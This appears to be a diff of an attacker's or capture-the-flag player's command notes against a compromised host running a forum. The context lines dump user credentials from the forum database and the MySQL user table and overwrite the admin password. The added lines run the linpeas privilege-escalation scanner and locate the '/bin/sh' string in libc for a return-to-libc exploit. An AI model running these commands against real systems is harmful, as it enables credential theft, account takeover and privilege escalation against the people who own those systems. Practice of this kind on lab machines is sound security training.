@@ -6,3 +6,9 @@ select user_name,user_pw,user_type,user_id from mlf2_userdata;
 select Host,User,Password from user;
 
 UPDATE forum_db.mlf2_userdata set user_pw=PASSWORD('getrekt') WHERE user_name='admin';
+./linpeas.sh -a > /dev/shm/linpeas.txt
+less -r /dev/shm/linpeas.txt
+
+
+info proc map
+strings -a -t x /usr/lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
